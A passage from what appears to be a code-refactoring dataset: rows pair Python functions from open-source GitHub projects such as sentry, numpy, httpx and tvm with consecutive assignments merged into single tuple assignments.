            image_name, label_index = line.rstrip('\r').rstrip('\n').split(' ')
            #img_dir = img_dir.strip()
            #image_name = image_name.upper()
            image_path = ops.join(img_dir, image_name.strip()) # 图片地址
            label_index = label_index.lower()
            label_index = _string_to_int(char_map_path, label_index) # label本是字符串，转为int
            if not ops.exists(image_path):
                print('Example image {:s} not exist'.format(image_path))
                continue
                #raise ValueError('Example image {:s} not exist'.format(image_path))
            annotation_infos.append((image_path, label_index)) # 结果

    for annotation_info in tqdm.tqdm(annotation_infos):
        image_path = annotation_info[0]
        label_index = annotation_info[1]
        try:
            _SAMPLE_INFO_QUEUE.put((image_path, label_index))
        except IndexError:
            print('Lexicon doesn\'t contain lexicon index {:d}'.format(label_index))
            continue
    for i in range(writer_process_nums): # 添加结束标志
        _SAMPLE_INFO_QUEUE.put(_SENTINEL)
    print('Complete filling dataset sample information queue[current size: {:d}], cost time: {:.5f}s'.format(
        _SAMPLE_INFO_QUEUE.qsize(), time.time() - t_start))","image_path = ops.join(img_dir, image_name.strip())
label_index = label_index.lower()","image_path , label_index  = ops.join(img_dir, image_name.strip()), label_index.lower()"
pysystemtrade,https://github.com/robcarver17/pysystemtrade/tree/master/sysobjects/instruments.py,assetClassesAndInstruments,as_pd$209,"def as_pd(self) -> pd.Series:
        instruments = [key for key in self.keys()]
        asset_classes = [value for value in self.values()]

        return pd.Series(asset_classes, index=instruments)","instruments = [key for key in self.keys()]
asset_classes = [value for value in self.values()]","instruments , asset_classes  = [key for key in self.keys()], [value for value in self.values()]"
differential-privacy-library,https://github.com/IBM/differential-privacy-library/tree/master/tests/tools/test_nanvar.py,TestNanVar,test_large_epsilon_axis$47,"def test_large_epsilon_axis(self):
        a = np.random.random((1000, 5))
        res = np.var(a, axis=0)
        res_dp = nanvar(a, epsilon=15, bounds=(0, 1), axis=0)

        for i in range(res.shape[0]):
            self.assertAlmostEqual(res[i], res_dp[i], delta=0.01)","res = np.var(a, axis=0)
res_dp = nanvar(a, epsilon=15, bounds=(0, 1), axis=0)","res , res_dp  = np.var(a, axis=0), nanvar(a, epsilon=15, bounds=(0, 1), axis=0)"
Dragonfire,https://github.com/DragonComputer/Dragonfire/tree/master/dragonfire/tests/test_utilities.py,,userin$17,"def userin():
    '''Returns a :class:`dragonfire.utilities.TextToAction` instance.'''

    args = {}
    args[""cli""] = True
    args[""silent""] = True
    args[""headless""] = True
    args[""verbose""] = False
    args[""gspeech""] = False
    args[""server""] = False
    args[""port""] = 3301
    args[""version""] = False
    return TextToAction(args, testing=True)","args['cli'] = True
args['silent'] = True
args['headless'] = True
args['verbose'] = False
args['gspeech'] = False
args['server'] = False
args['port'] = 3301
args['version'] = False","args['cli'] , args['silent'] , args['headless'] , args['verbose'] , args['gspeech'] , args['server'] , args['port'] , args['version']  = True, True, True, False, False, False, 3301, False"
sentry,https://github.com/getsentry/sentry/tree/master/src/sentry/notifications/helpers.py,,get_values_by_provider_by_type$157,"def get_values_by_provider_by_type(
    notification_settings_by_scope: Mapping[
        NotificationScopeType, Mapping[ExternalProviders, NotificationSettingOptionValues]
    ],
    all_providers: Iterable[ExternalProviders],
    type: NotificationSettingTypes,
    recipient: Team | User | None = None,
) -> Mapping[ExternalProviders, NotificationSettingOptionValues]:
    """"""
    Given a mapping of scopes to a mapping of default and specific notification
    settings by provider, determine the notification setting by provider for
    the given notification type.
    """"""
    parent_scope = get_scope_type(type)

    parent_specific_mapping = notification_settings_by_scope.get(parent_scope, {})
    organization_independent_mapping = (
        notification_settings_by_scope.get(NotificationScopeType.USER)
        or notification_settings_by_scope.get(NotificationScopeType.TEAM)
        or {}
    )

    return {
        provider: (
            parent_specific_mapping.get(provider)
            or organization_independent_mapping.get(provider)
            or _get_notification_setting_default(provider, type, recipient)
        )
        for provider in all_providers
    }","parent_specific_mapping = notification_settings_by_scope.get(parent_scope, {})
organization_independent_mapping = notification_settings_by_scope.get(NotificationScopeType.USER) or notification_settings_by_scope.get(NotificationScopeType.TEAM) or {}","parent_specific_mapping , organization_independent_mapping  = notification_settings_by_scope.get(parent_scope, {}), notification_settings_by_scope.get(NotificationScopeType.USER) or notification_settings_by_scope.get(NotificationScopeType.TEAM) or {}"
kivy,https://github.com/kivy/kivy/tree/master/kivy/tests/test_imageloader.py,_TestContext,end$183,"def end(self, fn=None):
        assert not fn or self._fn == fn, ""unexpected ctx.end(), fn mismatch""
        self._fn = None
        self._fd = None","self._fn = None
self._fd = None","self._fn , self._fd  = None, None"
wagtail,https://github.com/wagtail/wagtail/tree/master/wagtail/contrib/settings/tests/test_templates.py,TestTemplateTag,test_no_context_processor$77,"def test_no_context_processor(self):
        """"""
        Assert that not running the context processor means settings are not in
        the context, as expected.
        """"""
        template = Template('{{ settings.tests.TestSetting.title }}')
        context = Context()
        self.assertEqual(template.render(context), '')","template = Template('{{ settings.tests.TestSetting.title }}')
context = Context()","template , context  = Template('{{ settings.tests.TestSetting.title }}'), Context()"
twstock,https://github.com/mlouielu/twstock/tree/master/twstock/stock.py,Stock,_month_year_iter$156,"def _month_year_iter(self, start_month, start_year, end_month, end_year):
        ym_start = 12 * start_year + start_month - 1
        ym_end = 12 * end_year + end_month
        for ym in range(ym_start, ym_end):
            y, m = divmod(ym, 12)
            yield y, m + 1","ym_start = 12 * start_year + start_month - 1
ym_end = 12 * end_year + end_month","ym_start , ym_end  = 12 * start_year + start_month - 1, 12 * end_year + end_month"
ralph,https://github.com/allegro/ralph/tree/master/src/ralph/lib/transitions/tests/test_checks.py,TestChecks,test_transition_templates_item_should_be_two_elements_tuple$32,"def test_transition_templates_item_should_be_two_elements_tuple(self):
        errors = check_transition_templates((
            ('broken',),
            1234,
            'foo-bar.html'
        ))
        expected_errors = [
            Error(
                'Element #0 must be a two elements tuple',
                id='transitions.E003'
            ),
            Error(
                'Element #1 must be a two elements tuple',
                id='transitions.E003'
            ),
            Error(
                'Element #2 must be a two elements tuple',
                id='transitions.E003'
            ),
        ]
        self.assertEqual(expected_errors, errors)","errors = check_transition_templates((('broken',), 1234, 'foo-bar.html'))
expected_errors = [Error('Element #0 must be a two elements tuple', id='transitions.E003'), Error('Element #1 must be a two elements tuple', id='transitions.E003'), Error('Element #2 must be a two elements tuple', id='transitions.E003')]","errors , expected_errors  = check_transition_templates((('broken',), 1234, 'foo-bar.html')), [Error('Element #0 must be a two elements tuple', id='transitions.E003'), Error('Element #1 must be a two elements tuple', id='transitions.E003'), Error('Element #2 must be a two elements tuple', id='transitions.E003')]"
projector-installer,https://github.com/JetBrains/projector-installer/tree/master/projector_installer/dialogs.py,,select_new_config_name$182,"def select_new_config_name(hint: Optional[str]) -> Optional[str]:
    """"""Prompts for new config name and checks for collisions.""""""
    run_config = get_run_configs()

    if hint:
        hint = select_unused_config_name(hint)
        prompt = 'Enter a new configuration name or press ENTER for default'
    else:
        prompt = 'Enter a new configuration name'

    while True:
        name: str = prompt_with_default(prompt, default=hint if hint else '')

        if not name:
            return None

        if name in run_config:
            print(f'A configuration with name {name} already exists, please choose another name.')
            print('The known configurations:')
            list_configs()
            continue

        return name","hint = select_unused_config_name(hint)
prompt = 'Enter a new configuration name or press ENTER for default'","hint , prompt  = select_unused_config_name(hint), 'Enter a new configuration name or press ENTER for default'"
httpx,https://github.com/encode/httpx/tree/master/tests/test_utils.py,,test_same_origin$212,"def test_same_origin():
    origin1 = httpx.URL(""https://example.com"")
    origin2 = httpx.URL(""HTTPS://EXAMPLE.COM:443"")
    assert same_origin(origin1, origin2)","origin1 = httpx.URL('https://example.com')
origin2 = httpx.URL('HTTPS://EXAMPLE.COM:443')","origin1 , origin2  = httpx.URL('https://example.com'), httpx.URL('HTTPS://EXAMPLE.COM:443')"
adapter-transformers,https://github.com/Adapter-Hub/adapter-transformers/tree/master/src/transformers/data/datasets/language_modeling.py,TextDatasetForNextSentencePrediction,__init__$353,"def __init__(
        self,
        tokenizer: PreTrainedTokenizer,
        file_path: str,
        block_size: int,
        overwrite_cache=False,
        short_seq_probability=0.1,
        nsp_probability=0.5,
    ):
        warnings.warn(
            DEPRECATION_WARNING.format(
                ""https://github.com/huggingface/transformers/blob/main/examples/pytorch/language-modeling/run_mlm.py""
            ),
            FutureWarning,
        )
        if not os.path.isfile(file_path):
            raise ValueError(f""Input file path {file_path} not found"")

        self.short_seq_probability = short_seq_probability
        self.nsp_probability = nsp_probability

        directory, filename = os.path.split(file_path)
        cached_features_file = os.path.join(
            directory,
            f""cached_nsp_{tokenizer.__class__.__name__}_{block_size}_{filename}"",
        )

        self.tokenizer = tokenizer

        # Make sure only the first process in distributed training processes the dataset,
        # and the others will use the cache.
        lock_path = cached_features_file + "".lock""

        # Input file format:
        # (1) One sentence per line. These should ideally be actual sentences, not
        # entire paragraphs or arbitrary spans of text. (Because we use the
        # sentence boundaries for the ""next sentence prediction"" task).
        # (2) Blank lines between documents. Document boundaries are needed so
        # that the ""next sentence prediction"" task doesn't span between documents.
        #
        # Example:
        # I am very happy.
        # Here is the second sentence.
        #
        # A new document.

        with FileLock(lock_path):
            if os.path.exists(cached_features_file) and not overwrite_cache:
                start = time.time()
                with open(cached_features_file, ""rb"") as handle:
                    self.examples = pickle.load(handle)
                logger.info(
                    f""Loading features from cached file {cached_features_file} [took %.3f s]"", time.time() - start
                )
            else:
                logger.info(f""Creating features from dataset file at {directory}"")

                self.documents = [[]]
                with open(file_path, encoding=""utf-8"") as f:
                    while True:
                        line = f.readline()
                        if not line:
                            break
                        line = line.strip()

                        # Empty lines are used as document delimiters
                        if not line and len(self.documents[-1]) != 0:
                            self.documents.append([])
                        tokens = tokenizer.tokenize(line)
                        tokens = tokenizer.convert_tokens_to_ids(tokens)
                        if tokens:
                            self.documents[-1].append(tokens)

                logger.info(f""Creating examples from {len(self.documents)} documents."")
                self.examples = []
                for doc_index, document in enumerate(self.documents):
                    self.create_examples_from_document(document, doc_index, block_size)

                start = time.time()
                with open(cached_features_file, ""wb"") as handle:
                    pickle.dump(self.examples, handle, protocol=pickle.HIGHEST_PROTOCOL)
                logger.info(
                    f""Saving features into cached file {cached_features_file} [took {time.time() - start:.3f} s]""
                )","self.short_seq_probability = short_seq_probability
self.nsp_probability = nsp_probability","self.short_seq_probability , self.nsp_probability  = short_seq_probability, nsp_probability"
adapter-transformers,https://github.com/Adapter-Hub/adapter-transformers/tree/master/src/transformers/data/datasets/language_modeling.py,TextDatasetForNextSentencePrediction,__init__$353,"def __init__(
        self,
        tokenizer: PreTrainedTokenizer,
        file_path: str,
        block_size: int,
        overwrite_cache=False,
        short_seq_probability=0.1,
        nsp_probability=0.5,
    ):
        warnings.warn(
            DEPRECATION_WARNING.format(
                ""https://github.com/huggingface/transformers/blob/main/examples/pytorch/language-modeling/run_mlm.py""
            ),
            FutureWarning,
        )
        if not os.path.isfile(file_path):
            raise ValueError(f""Input file path {file_path} not found"")

        self.short_seq_probability = short_seq_probability
        self.nsp_probability = nsp_probability

        directory, filename = os.path.split(file_path)
        cached_features_file = os.path.join(
            directory,
            f""cached_nsp_{tokenizer.__class__.__name__}_{block_size}_{filename}"",
        )

        self.tokenizer = tokenizer

        # Make sure only the first process in distributed training processes the dataset,
        # and the others will use the cache.
        lock_path = cached_features_file + "".lock""

        # Input file format:
        # (1) One sentence per line. These should ideally be actual sentences, not
        # entire paragraphs or arbitrary spans of text. (Because we use the
        # sentence boundaries for the ""next sentence prediction"" task).
        # (2) Blank lines between documents. Document boundaries are needed so
        # that the ""next sentence prediction"" task doesn't span between documents.
        #
        # Example:
        # I am very happy.
        # Here is the second sentence.
        #
        # A new document.

        with FileLock(lock_path):
            if os.path.exists(cached_features_file) and not overwrite_cache:
                start = time.time()
                with open(cached_features_file, ""rb"") as handle:
                    self.examples = pickle.load(handle)
                logger.info(
                    f""Loading features from cached file {cached_features_file} [took %.3f s]"", time.time() - start
                )
            else:
                logger.info(f""Creating features from dataset file at {directory}"")

                self.documents = [[]]
                with open(file_path, encoding=""utf-8"") as f:
                    while True:
                        line = f.readline()
                        if not line:
                            break
                        line = line.strip()

                        # Empty lines are used as document delimiters
                        if not line and len(self.documents[-1]) != 0:
                            self.documents.append([])
                        tokens = tokenizer.tokenize(line)
                        tokens = tokenizer.convert_tokens_to_ids(tokens)
                        if tokens:
                            self.documents[-1].append(tokens)

                logger.info(f""Creating examples from {len(self.documents)} documents."")
                self.examples = []
                for doc_index, document in enumerate(self.documents):
                    self.create_examples_from_document(document, doc_index, block_size)

                start = time.time()
                with open(cached_features_file, ""wb"") as handle:
                    pickle.dump(self.examples, handle, protocol=pickle.HIGHEST_PROTOCOL)
                logger.info(
                    f""Saving features into cached file {cached_features_file} [took {time.time() - start:.3f} s]""
                )","self.tokenizer = tokenizer
lock_path = cached_features_file + '.lock'","self.tokenizer , lock_path  = tokenizer, cached_features_file + '.lock'"
CRNN_Chinese_Characters_Rec,https://github.com/Sierkinhane/CRNN_Chinese_Characters_Rec/tree/master/lib/core/function.py,,train$27,"def train(config, train_loader, dataset, converter, model, criterion, optimizer, device, epoch, writer_dict=None, output_dict=None):

    batch_time = AverageMeter()
    data_time = AverageMeter()
    losses = AverageMeter()

    model.train()

    end = time.time()
    for i, (inp, idx) in enumerate(train_loader):
        # measure data time
        data_time.update(time.time() - end)

        labels = utils.get_batch_label(dataset, idx)
        inp = inp.to(device)

        # inference
        preds = model(inp).cpu()

        # compute loss
        batch_size = inp.size(0)
        text, length = converter.encode(labels)                    # length = 一个batch中的总字符长度, text = 一个batch中的字符所对应的下标
        preds_size = torch.IntTensor([preds.size(0)] * batch_size) # timestep * batchsize
        loss = criterion(preds, text, preds_size, length)

        optimizer.zero_grad()
        loss.backward()
        optimizer.step()

        losses.update(loss.item(), inp.size(0))

        batch_time.update(time.time()-end)
        if i % config.PRINT_FREQ == 0:
            msg = 'Epoch: [{0}][{1}/{2}]\t' \
                  'Time {batch_time.val:.3f}s ({batch_time.avg:.3f}s)\t' \
                  'Speed {speed:.1f} samples/s\t' \
                  'Data {data_time.val:.3f}s ({data_time.avg:.3f}s)\t' \
                  'Loss {loss.val:.5f} ({loss.avg:.5f})\t'.format(
                      epoch, i, len(train_loader), batch_time=batch_time,
                      speed=inp.size(0)/batch_time.val,
                      data_time=data_time, loss=losses)
            print(msg)

            if writer_dict:
                writer = writer_dict['writer']
                global_steps = writer_dict['train_global_steps']
                writer.add_scalar('train_loss', losses.avg, global_steps)
                writer_dict['train_global_steps'] = global_steps + 1

        end = time.time()","batch_time = AverageMeter()
data_time = AverageMeter()
losses = AverageMeter()","batch_time , data_time , losses  = AverageMeter(), AverageMeter(), AverageMeter()"
CRNN_Chinese_Characters_Rec,https://github.com/Sierkinhane/CRNN_Chinese_Characters_Rec/tree/master/lib/core/function.py,,train$27,"def train(config, train_loader, dataset, converter, model, criterion, optimizer, device, epoch, writer_dict=None, output_dict=None):

    batch_time = AverageMeter()
    data_time = AverageMeter()
    losses = AverageMeter()

    model.train()

    end = time.time()
    for i, (inp, idx) in enumerate(train_loader):
        # measure data time
        data_time.update(time.time() - end)

        labels = utils.get_batch_label(dataset, idx)
        inp = inp.to(device)

        # inference
        preds = model(inp).cpu()

        # compute loss
        batch_size = inp.size(0)
        text, length = converter.encode(labels)                    # length = 一个batch中的总字符长度, text = 一个batch中的字符所对应的下标
        preds_size = torch.IntTensor([preds.size(0)] * batch_size) # timestep * batchsize
        loss = criterion(preds, text, preds_size, length)

        optimizer.zero_grad()
        loss.backward()
        optimizer.step()

        losses.update(loss.item(), inp.size(0))

        batch_time.update(time.time()-end)
        if i % config.PRINT_FREQ == 0:
            msg = 'Epoch: [{0}][{1}/{2}]\t' \
                  'Time {batch_time.val:.3f}s ({batch_time.avg:.3f}s)\t' \
                  'Speed {speed:.1f} samples/s\t' \
                  'Data {data_time.val:.3f}s ({data_time.avg:.3f}s)\t' \
                  'Loss {loss.val:.5f} ({loss.avg:.5f})\t'.format(
                      epoch, i, len(train_loader), batch_time=batch_time,
                      speed=inp.size(0)/batch_time.val,
                      data_time=data_time, loss=losses)
            print(msg)

            if writer_dict:
                writer = writer_dict['writer']
                global_steps = writer_dict['train_global_steps']
                writer.add_scalar('train_loss', losses.avg, global_steps)
                writer_dict['train_global_steps'] = global_steps + 1

        end = time.time()","labels = utils.get_batch_label(dataset, idx)
inp = inp.to(device)","labels , inp  = utils.get_batch_label(dataset, idx), inp.to(device)"
CRNN_Chinese_Characters_Rec,https://github.com/Sierkinhane/CRNN_Chinese_Characters_Rec/tree/master/lib/core/function.py,,train$27,"def train(config, train_loader, dataset, converter, model, criterion, optimizer, device, epoch, writer_dict=None, output_dict=None):

    batch_time = AverageMeter()
    data_time = AverageMeter()
    losses = AverageMeter()

    model.train()

    end = time.time()
    for i, (inp, idx) in enumerate(train_loader):
        # measure data time
        data_time.update(time.time() - end)

        labels = utils.get_batch_label(dataset, idx)
        inp = inp.to(device)

        # inference
        preds = model(inp).cpu()

        # compute loss
        batch_size = inp.size(0)
        text, length = converter.encode(labels)                    # length = 一个batch中的总字符长度, text = 一个batch中的字符所对应的下标
        preds_size = torch.IntTensor([preds.size(0)] * batch_size) # timestep * batchsize
        loss = criterion(preds, text, preds_size, length)

        optimizer.zero_grad()
        loss.backward()
        optimizer.step()

        losses.update(loss.item(), inp.size(0))

        batch_time.update(time.time()-end)
        if i % config.PRINT_FREQ == 0:
            msg = 'Epoch: [{0}][{1}/{2}]\t' \
                  'Time {batch_time.val:.3f}s ({batch_time.avg:.3f}s)\t' \
                  'Speed {speed:.1f} samples/s\t' \
                  'Data {data_time.val:.3f}s ({data_time.avg:.3f}s)\t' \
                  'Loss {loss.val:.5f} ({loss.avg:.5f})\t'.format(
                      epoch, i, len(train_loader), batch_time=batch_time,
                      speed=inp.size(0)/batch_time.val,
                      data_time=data_time, loss=losses)
            print(msg)

            if writer_dict:
                writer = writer_dict['writer']
                global_steps = writer_dict['train_global_steps']
                writer.add_scalar('train_loss', losses.avg, global_steps)
                writer_dict['train_global_steps'] = global_steps + 1

        end = time.time()","preds = model(inp).cpu()
batch_size = inp.size(0)","preds , batch_size  = model(inp).cpu(), inp.size(0)"
CRNN_Chinese_Characters_Rec,https://github.com/Sierkinhane/CRNN_Chinese_Characters_Rec/tree/master/lib/core/function.py,,train$27,"def train(config, train_loader, dataset, converter, model, criterion, optimizer, device, epoch, writer_dict=None, output_dict=None):

    batch_time = AverageMeter()
    data_time = AverageMeter()
    losses = AverageMeter()

    model.train()

    end = time.time()
    for i, (inp, idx) in enumerate(train_loader):
        # measure data time
        data_time.update(time.time() - end)

        labels = utils.get_batch_label(dataset, idx)
        inp = inp.to(device)

        # inference
        preds = model(inp).cpu()

        # compute loss
        batch_size = inp.size(0)
        text, length = converter.encode(labels)                    # length = 一个batch中的总字符长度, text = 一个batch中的字符所对应的下标
        preds_size = torch.IntTensor([preds.size(0)] * batch_size) # timestep * batchsize
        loss = criterion(preds, text, preds_size, length)

        optimizer.zero_grad()
        loss.backward()
        optimizer.step()

        losses.update(loss.item(), inp.size(0))

        batch_time.update(time.time()-end)
        if i % config.PRINT_FREQ == 0:
            msg = 'Epoch: [{0}][{1}/{2}]\t' \
                  'Time {batch_time.val:.3f}s ({batch_time.avg:.3f}s)\t' \
                  'Speed {speed:.1f} samples/s\t' \
                  'Data {data_time.val:.3f}s ({data_time.avg:.3f}s)\t' \
                  'Loss {loss.val:.5f} ({loss.avg:.5f})\t'.format(
                      epoch, i, len(train_loader), batch_time=batch_time,
                      speed=inp.size(0)/batch_time.val,
                      data_time=data_time, loss=losses)
            print(msg)

            if writer_dict:
                writer = writer_dict['writer']
                global_steps = writer_dict['train_global_steps']
                writer.add_scalar('train_loss', losses.avg, global_steps)
                writer_dict['train_global_steps'] = global_steps + 1

        end = time.time()","writer = writer_dict['writer']
global_steps = writer_dict['train_global_steps']","writer , global_steps  = writer_dict['writer'], writer_dict['train_global_steps']"
recordlinkage,https://github.com/J535D165/recordlinkage/tree/master/recordlinkage/datasets/febrl.py,,_febrl_links$28,"def _febrl_links(df):
    """"""Get the links of a FEBRL dataset.""""""

    index = df.index.to_series()
    keys = index.str.extract(r'rec-(\d+)', expand=True)[0]

    index_int = numpy.arange(len(df))

    df_helper = pandas.DataFrame({'key': keys, 'index': index_int})

    # merge the two frame and make MultiIndex.
    pairs_df = df_helper.merge(df_helper, on='key')[['index_x', 'index_y']]
    pairs_df = pairs_df[pairs_df['index_x'] > pairs_df['index_y']]

    return pandas.MultiIndex(
        levels=[df.index.values, df.index.values],
        codes=[pairs_df['index_x'].values, pairs_df['index_y'].values],
        names=[None, None],
        verify_integrity=False)","keys = index.str.extract('rec-(\\d+)', expand=True)[0]
index_int = numpy.arange(len(df))","keys , index_int  = index.str.extract('rec-(\\d+)', expand=True)[0], numpy.arange(len(df))"
pootle,https://github.com/translate/pootle/tree/master/pootle/apps/pootle_fs/state.py,ProjectFSState,state_fs_ahead$233,"def state_fs_ahead(self):
        all_pootle_changed = list(
            self.resources.pootle_changed.values_list(""pk"", flat=True))
        all_fs_changed = list(self.resources.fs_changed)
        fs_changed = self.resources.synced.filter(pk__in=all_fs_changed)
        fs_changed = (
            fs_changed.exclude(pk__in=all_pootle_changed)
            | (fs_changed.filter(pk__in=all_pootle_changed)
                         .filter(resolve_conflict=SOURCE_WINS)))
        fs_changed = fs_changed.values_list(
            ""pk"", ""pootle_path"", ""path"", ""store_id"", ""store__obsolete"")
        fs_hashes = self.resources.file_hashes
        pootle_revisions = self.resources.pootle_revisions
        for changed in fs_changed.iterator():
            pk, pootle_path, path, store_id, store_obsolete = changed
            if store_obsolete:
                continue
            if pootle_path not in fs_hashes:
                # fs_removed
                continue
            if store_id not in pootle_revisions:
                # pootle_removed
                continue
            yield dict(
                store_fs=pk,
                pootle_path=pootle_path,
                fs_path=path)","all_pootle_changed = list(self.resources.pootle_changed.values_list('pk', flat=True))
all_fs_changed = list(self.resources.fs_changed)","all_pootle_changed , all_fs_changed  = list(self.resources.pootle_changed.values_list('pk', flat=True)), list(self.resources.fs_changed)"
pootle,https://github.com/translate/pootle/tree/master/pootle/apps/pootle_fs/state.py,ProjectFSState,state_fs_ahead$233,"def state_fs_ahead(self):
        all_pootle_changed = list(
            self.resources.pootle_changed.values_list(""pk"", flat=True))
        all_fs_changed = list(self.resources.fs_changed)
        fs_changed = self.resources.synced.filter(pk__in=all_fs_changed)
        fs_changed = (
            fs_changed.exclude(pk__in=all_pootle_changed)
            | (fs_changed.filter(pk__in=all_pootle_changed)
                         .filter(resolve_conflict=SOURCE_WINS)))
        fs_changed = fs_changed.values_list(
            ""pk"", ""pootle_path"", ""path"", ""store_id"", ""store__obsolete"")
        fs_hashes = self.resources.file_hashes
        pootle_revisions = self.resources.pootle_revisions
        for changed in fs_changed.iterator():
            pk, pootle_path, path, store_id, store_obsolete = changed
            if store_obsolete:
                continue
            if pootle_path not in fs_hashes:
                # fs_removed
                continue
            if store_id not in pootle_revisions:
                # pootle_removed
                continue
            yield dict(
                store_fs=pk,
                pootle_path=pootle_path,
                fs_path=path)","fs_changed = fs_changed.values_list('pk', 'pootle_path', 'path', 'store_id', 'store__obsolete')
fs_hashes = self.resources.file_hashes
pootle_revisions = self.resources.pootle_revisions","fs_changed , fs_hashes , pootle_revisions  = fs_changed.values_list('pk', 'pootle_path', 'path', 'store_id', 'store__obsolete'), self.resources.file_hashes, self.resources.pootle_revisions"
legion,https://github.com/GoVanguard/legion/tree/master/ui/models/cvemodels.py,CvesTableModel,data$62,"def data(self, index, role):  # this method takes care of how the information is displayed
        if role == QtCore.Qt.DisplayRole or role == QtCore.Qt.EditRole:  # how to display each cell
            row = index.row()
            column = index.column()
            return self.__cves[row][self.columnMapping[column]]","row = index.row()
column = index.column()","row , column  = index.row(), index.column()"
sbnet,https://github.com/uber-research/sbnet/tree/master/sbnet_tensorflow/benchmark/tf_conv_dims.py,,calc_out_size_4d_np$243,"def calc_out_size_4d_np(in_shape, ksize, strides, padding):
    """"""Calculates output shape (rank 4) of a 2D convolution operation.

    :param in_shape: [list]    Input tensor shape.
    :param ksize:    [list]    Kernel shape.
    :param strides:  [list]    Strides list.
    :param padding:  [string]  Padding method, `SAME` or `VALID`.

    :return          [list]    Output tensor shape.
    """"""
    strides = _check_strides(strides)
    ksize = _check_ksize(ksize)
    return [
        in_shape[0],
        calc_out_size_1d_np(in_shape[1], ksize[0], strides[1], padding),
        calc_out_size_1d_np(in_shape[2], ksize[1], strides[2], padding), ksize[3]
    ]","strides = _check_strides(strides)
ksize = _check_ksize(ksize)","strides , ksize  = _check_strides(strides), _check_ksize(ksize)"
Det3D,https://github.com/poodarchu/Det3D/tree/master/det3d/datasets/pipelines/transforms.py,MinIoURandomCrop,__init__$556,"def __init__(self, min_ious=(0.1, 0.3, 0.5, 0.7, 0.9), min_crop_size=0.3):
        # 1: return ori img
        self.sample_mode = (1, *min_ious, 0)
        self.min_crop_size = min_crop_size","self.sample_mode = (1, *min_ious, 0)
self.min_crop_size = min_crop_size","self.sample_mode , self.min_crop_size  = (1, *min_ious, 0), min_crop_size"
angr,https://github.com/angr/angr/tree/master/angr/state_hierarchy.py,StateHierarchy,lineage$108,"def lineage(self, h):
        """"""
        Returns the lineage of histories leading up to `h`.
        """"""

        lineage = [ ]

        predecessors = list(self._graph.predecessors(h))
        while len(predecessors):
            lineage.append(predecessors[0])
            predecessors = list(self._graph.predecessors(predecessors[0]))

        lineage.reverse()
        return lineage","lineage = []
predecessors = list(self._graph.predecessors(h))","lineage , predecessors  = [], list(self._graph.predecessors(h))"
dictdiffer,https://github.com/inveniosoftware/dictdiffer/tree/master/tests/test_dictdiffer.py,DictDifferTests,test_ignore_key$347,"def test_ignore_key(self):
        first = {'a': 'a', 'b': 'b', 'c': 'c'}
        second = {'a': 'a', 'b': 2, 'c': 3}
        diffed = next(diff(first, second, ignore=['b']))
        assert ('change', 'c', ('c', 3)) == diffed","first = {'a': 'a', 'b': 'b', 'c': 'c'}
second = {'a': 'a', 'b': 2, 'c': 3}","first , second  = {'a': 'a', 'b': 'b', 'c': 'c'}, {'a': 'a', 'b': 2, 'c': 3}"
bertviz,https://github.com/jessevig/bertviz/tree/master/bertviz/transformers_neuron_view/tokenization_utils.py,PreTrainedTokenizer,all_special_tokens$628,"def all_special_tokens(self):
        """""" List all the special tokens ('<unk>', '<cls>'...) mapped to class attributes
            (cls_token, unk_token...).
        """"""
        all_toks = []
        set_attr = self.special_tokens_map
        for attr_value in set_attr.values():
            all_toks = all_toks + (attr_value if isinstance(attr_value, (list, tuple)) else [attr_value])
        all_toks = list(set(all_toks))
        return all_toks","all_toks = []
set_attr = self.special_tokens_map","all_toks , set_attr  = [], self.special_tokens_map"
numpy,https://github.com/numpy/numpy/tree/master/numpy/random/tests/test_random.py,TestRandomDist,test_choice_uniform_noreplace$380,"def test_choice_uniform_noreplace(self):
        np.random.seed(self.seed)
        actual = np.random.choice(4, 3, replace=False)
        desired = np.array([0, 1, 3])
        assert_array_equal(actual, desired)","actual = np.random.choice(4, 3, replace=False)
desired = np.array([0, 1, 3])","actual , desired  = np.random.choice(4, 3, replace=False), np.array([0, 1, 3])"
tvm,https://github.com/apache/tvm/tree/master/tests/python/unittest/test_tir_transform_loop_partition.py,,test_condition_EQ$205,"def test_condition_EQ():
    ib = tvm.tir.ir_builder.create()
    m = te.size_var(""m"")
    n = te.size_var(""n"")
    with ib.for_range(0, 10, ""i"") as i:
        ib.emit(tvm.tir.Evaluate(tvm.tir.Select(ib.likely(tvm.tir.EQ(i, 5)), m, n)))
    stmt = ib.get()

    mod = tvm.IRModule.from_expr(tvm.tir.PrimFunc([m, n], stmt))
    with tvm.transform.PassContext(config={""tir.LoopPartition"": {""partition_const_loop"": True}}):
        mod = tvm.tir.transform.LoopPartition()(mod)
        stmt = tvm.tir.transform.Simplify()(mod)[""main""].body

    assert not any(collect_visit(stmt[0], lambda x: isinstance(x, tvm.tir.Select)))","ib = tvm.tir.ir_builder.create()
m = te.size_var('m')
n = te.size_var('n')","ib , m , n  = tvm.tir.ir_builder.create(), te.size_var('m'), te.size_var('n')"
django-oauth-toolkit,https://github.com/jazzband/django-oauth-toolkit/tree/master/tests/conftest.py,,oauth2_settings$61,"def oauth2_settings(request, settings):
    """"""
    A fixture that provides a simple way to override OAUTH2_PROVIDER settings.

    It can be used two ways - either setting things on the fly, or by reading
    configuration data from the pytest marker oauth2_settings.

    If used on a standard pytest function, you can use argument dependency
    injection to get the wrapper. If used on a unittest.TestCase, the wrapper
    is made available on the class instance, as `oauth2_settings`.

    Anything overridden will be restored at the end of the test case, ensuring
    that there is no configuration leakage between test cases.
    """"""
    marker = request.node.get_closest_marker(""oauth2_settings"")
    user_settings = {}
    if marker is not None:
        user_settings = marker.args[0]
    wrapper = OAuthSettingsWrapper(settings, user_settings)
    if request.instance is not None:
        request.instance.oauth2_settings = wrapper
    yield wrapper
    wrapper.finalize()","marker = request.node.get_closest_marker('oauth2_settings')
user_settings = {}","marker , user_settings  = request.node.get_closest_marker('oauth2_settings'), {}"
qiskit-terra,https://github.com/Qiskit/qiskit-terra/tree/master/test/python/quantum_info/operators/symplectic/test_pauli_table.py,TestPauliTableOperator,test_compose_1q$558,"def test_compose_1q(self):
        """"""Test 1-qubit compose methods.""""""
        # Test single qubit Pauli dot products
        pauli = PauliTable.from_labels([""I"", ""X"", ""Y"", ""Z""])

        with self.subTest(msg=""compose single I""):
            target = PauliTable.from_labels([""I"", ""X"", ""Y"", ""Z""])
            value = pauli.compose(""I"")
            self.assertEqual(target, value)

        with self.subTest(msg=""compose single X""):
            target = PauliTable.from_labels([""X"", ""I"", ""Z"", ""Y""])
            value = pauli.compose(""X"")
            self.assertEqual(target, value)

        with self.subTest(msg=""compose single Y""):
            target = PauliTable.from_labels([""Y"", ""Z"", ""I"", ""X""])
